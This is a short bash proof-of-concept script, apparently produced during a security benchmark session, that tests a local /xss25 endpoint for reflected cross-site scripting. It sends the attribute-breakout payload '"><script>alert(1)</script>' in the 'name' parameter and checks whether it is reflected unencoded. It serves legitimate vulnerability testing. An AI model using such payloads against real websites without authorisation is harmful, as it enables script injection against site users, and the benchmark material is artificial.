#!/bin/bash
# POC: Demonstrates reflected XSS via HTML attribute breakout in the 'name' parameter of /xss25 endpoint
# Target: ./repo
# Created: 2025-11-04T14:25:46.252Z
# Session: benchmark-XBEN-017-24-mhknp4e4

# Reflected XSS via Attribute Breakout POC
# Target: http://localhost:5000/xss25
# Parameter: name
# Vulnerability: User input reflected in HTML attribute without proper encoding

TARGET_URL="http://localhost:5000/xss25"
PAYLOAD='"><script>alert(1)</script>'

echo "[*] Testing Reflected XSS via Attribute Breakout"
echo "[*] Target: $TARGET_URL"
echo "[*] Payload: $PAYLOAD"
echo ""

# URL encode the payload for the query string
ENCODED_PAYLOAD=$(echo -n "$PAYLOAD" | jq -sRr @uri)

# Make the request
FULL_URL="$TARGET_URL?name=$ENCODED_PAYLOAD"
echo "[*] Full URL: $FULL_URL"
echo ""

# Fetch the response
RESPONSE=$(curl -s "$FULL_URL")

echo "[*] Response received:"
echo "$RESPONSE"
echo ""

# Check if the payload is reflected in the response without encoding
if echo "$RESPONSE" | grep -q '"><script>alert(1)</script>'; then
    echo "[+] VULNERABLE: Payload reflected without encoding!"
    echo "[+] The script tag was injected and will execute in browser context"
    exit 0
else
    echo "[-] Payload not found in response or appears to be encoded"
    exit 1
fi